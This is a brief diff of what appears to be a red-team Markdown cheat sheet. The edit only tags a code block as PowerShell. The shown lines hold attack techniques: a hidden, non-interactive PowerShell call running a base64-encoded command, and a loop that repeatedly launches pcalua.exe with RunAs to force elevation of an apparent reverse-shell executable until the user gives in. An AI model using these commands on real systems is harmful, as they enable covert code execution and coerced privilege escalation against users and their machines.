@@ -130,7 +130,7 @@ powershell -noni -w hidden -e dAByAHkAIAB7AHQAaAByAG8AdwAgACIAIgB9ACAAYwBhAHQAYw
 
 ## execute any powershell script
 
-```
+```powershell
 try {throw ""} catch {while ( -not $? ){try {Start-Process pcalua.exe -ArgumentList "-a C:\Users\redteam\Desktop\rev-mark2.exe"  -Verb RunAs} catch {Write-Error "" -ErrorAction SilentlyContinue}}}
 ```
 
